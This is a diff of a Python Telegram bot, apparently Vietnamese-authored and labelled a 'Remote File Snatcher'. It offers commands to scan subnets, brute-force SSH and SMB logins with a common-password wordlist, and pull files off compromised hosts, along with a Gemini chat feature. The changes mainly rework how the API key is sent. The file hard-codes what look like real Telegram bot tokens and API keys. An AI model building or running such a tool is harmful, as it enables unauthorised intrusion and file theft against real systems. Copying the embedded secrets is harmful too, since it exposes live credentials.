@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # Bot Telegram - Remote File Snatcher + PDF Link + AI (Gemini)
 # Token: 8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY
-# AI API Key: AQ.Ab8RN6IuiHMDxJRTJxCV-g3a3RbJrfrzMeu1ryrLFmVymYZSTQ
+# AI API Key (dạng AQ. mới): AQ.Ab8RN6ISJHt7Wz6UBTlF5MWeYTfZHDoBuCoyX0JsUx07cQgPAg
 
 import os, sys, socket, ipaddress, tempfile, threading, time, asyncio, json, re, requests
 try:
@@ -24,13 +25,12 @@ except ImportError:
     gdown = None
 
 TOKEN = "8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY"
-AI_API_KEY = "AQ.Ab8RN6IuiHMDxJRTJxCV-g3a3RbJrfrzMeu1ryrLFmVymYZSTQ"
+AI_API_KEY = "AQ.Ab8RN6ISJHt7Wz6UBTlF5MWeYTfZHDoBuCoyX0JsUx07cQgPAg"
 WORDLIST = ["admin","password","123456","root","user","test","guest","P@ssw0rd","password123"]
 TIMEOUT = 2
 SCAN_THREADS = 50
-
-# ---------- LƯU TRỮ LINK PDF ----------
 PDF_LINKS_FILE = "pdf_links.json"
+
 def load_links():
     try:
         with open(PDF_LINKS_FILE, 'r') as f:
@@ -42,7 +42,6 @@ def save_links(links):
         json.dump(links, f, indent=2)
 pdf_links = load_links()
 
-# ---------- HÀM TẢI TỪ LINK ----------
 def download_from_link(link, local_path):
     if 'drive.google.com' in link:
         if gdown is None: return False
@@ -63,28 +62,28 @@ def download_from_link(link, local_path):
         except:
             return False
 
-# ---------- HÀM GỌI GEMINI AI ----------
 def ask_gemini(prompt):
-    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={AI_API_KEY}"
-    headers = {"Content-Type": "application/json"}
-    data = {
+    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
+    headers = {
+        "Content-Type": "application/json",
+        "x-goog-api-key": AI_API_KEY   # DÙNG HEADER NÀY CHO KEY DẠNG AQ.
+    }
+    payload = {
         "contents": [{"parts": [{"text": prompt}]}]
     }
     try:
-        resp = requests.post(url, json=data, headers=headers, timeout=30)
+        resp = requests.post(url, json=payload, headers=headers, timeout=30)
         if resp.status_code == 200:
-            result = resp.json()
+            data = resp.json()
             try:
-                text = result['candidates'][0]['content']['parts'][0]['text']
-                return text
+                return data['candidates'][0]['content']['parts'][0]['text']
             except:
-                return "Lỗi parse response AI."
+                return "Lỗi parse response từ AI."
         else:
-            return f"Lỗi API: {resp.status_code} - {resp.text}"
+            return f"Lỗi API ({resp.status_code}): {resp.text}"
     except Exception as e:
         return f"Lỗi kết nối AI: {e}"
 
-# ---------- QUÉT/BRUTE/TẢI (giữ nguyên) ----------
 def scan_ports(ip, ports):
     open_ports = []
     for port in ports:
@@ -179,14 +178,14 @@ def get_file_smb(ip, user, pwd, remote, local):
     except:
         return False
 
-# ---------- CÁC HÀM XỬ LÝ LỆNH BOT ----------
+
 async def start(update, context):
     await update.message.reply_text(
         "🤖 Bot đa chức năng\n"
         "/scan <subnet>\n/brutessh <ip> <user>\n/getssh <ip> <user> <pass> <path>\n"
         "/brutesmb <ip>\n/getsmb <ip> <user> <pass> <share/path>\n"
         "/setpdf <tên> <link>\n/listpdf\n/getpdf <tên>\n"
-        "/ai <câu hỏi> – Hỏi AI Gemini\n"
+        "/ai <câu hỏi> – Hỏi AI "
         "/help – trợ giúp"
     )
 
@@ -278,7 +277,6 @@ async def getsmb_cmd(update, context):
         await update.message.reply_text("❌ Tải thất bại.")
         if os.path.exists(local): os.unlink(local)
 
-# ---------- LỆNH PDF LINK ----------
 async def setpdf_cmd(update, context):
     args = context.args
     if len(args) < 2:
@@ -326,7 +324,6 @@ async def getpdf_cmd(update, context):
         await update.message.reply_text("❌ Tải thất bại.")
         if os.path.exists(local): os.unlink(local)
 
-# ---------- LỆNH AI (GEMINI) ----------
 async def ai_cmd(update, context):
     args = context.args
     if not args:
@@ -336,7 +333,6 @@ async def ai_cmd(update, context):
     await update.message.reply_text("🤖 Đang suy nghĩ...")
     loop = asyncio.get_event_loop()
     reply = await loop.run_in_executor(None, ask_gemini, prompt)
-    # Nếu reply quá dài, cắt
     if len(reply) > 4096:
         reply = reply[:4090] + "...(cắt)"
     await update.message.reply_text(reply)
@@ -344,7 +340,7 @@ async def ai_cmd(update, context):
 async def help_cmd(update, context):
     await start(update, context)
 
-# ---------- MAIN ----------
+
 def main():
     if paramiko is None: print("⚠️ paramiko chưa cài")
     if SMBConnection is None: print("⚠️ impacket chưa cài")
